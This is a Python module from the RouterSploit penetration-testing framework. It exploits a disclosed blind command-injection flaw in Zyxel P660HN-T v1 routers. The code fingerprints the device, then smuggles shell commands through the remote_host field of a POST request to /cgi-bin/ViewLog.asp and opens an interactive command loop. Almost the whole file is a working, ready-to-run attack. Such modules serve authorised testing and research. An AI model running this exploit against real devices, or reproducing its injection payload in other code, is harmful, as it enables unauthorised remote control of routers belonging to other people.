from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Zyxel P660HN-T v1 RCE",
        "description": "Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T v1 devices. "
                       "If the target is vulnerable it allows to execute commands on operating system level.",
        "authors": (
            "Pedro Ribeiro <pedrib[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://seclists.org/fulldisclosure/2017/Jan/40",
            "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt",
            "https://blogs.securiteam.com/index.php/archives/2910",
        ),
        "devices": (
            "Zyxel P660HN-T v1",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address: 192.168.1.1")
    port = OptPort(80, "Target port")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target seems to be not vulnerable")

    def execute(self, cmd):
        payload = ";{};#".format(cmd)
        data = {
            "remote_submit_Flag": "1",
            "remote_syslog_Flag": "1",
            "RemoteSyslogSupported": "1",
            "LogFlag": "0",
            "remote_host": payload,
            "remoteSubmit": "Save"
        }

        self.http_request(
            method="POST",
            path="/cgi-bin/ViewLog.asp",
            data=data
        )

        return ""

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/cgi-bin/authorize.asp",
        )
        if response is None:
            return False

        if "ZyXEL P-660HN-T1A" in response.text:
            return True

        return False
